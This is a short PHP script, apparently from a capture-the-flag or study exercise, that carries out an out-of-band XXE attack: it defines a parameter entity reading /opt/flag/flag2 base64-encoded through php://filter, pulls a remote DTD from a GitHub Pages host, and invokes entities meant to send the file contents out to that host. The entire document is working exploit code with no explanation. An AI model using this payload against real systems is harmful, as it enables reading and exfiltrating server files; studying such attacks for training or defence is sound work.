<?php 
$xml=<<<EOF 
<?xml version="1.0"?> 
<!DOCTYPE ANY[ 
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/opt/flag/flag2"> 
<!ENTITY % remote SYSTEM "https://yaoyaodj.github.io/testStudy/phpxxe/test.xml"> 
%remote;
%all;
%send; 
]> 
EOF; 
$data = simplexml_load_string($xml) ; 
echo "<pre>" ; 
print_r($data) ; 
?>
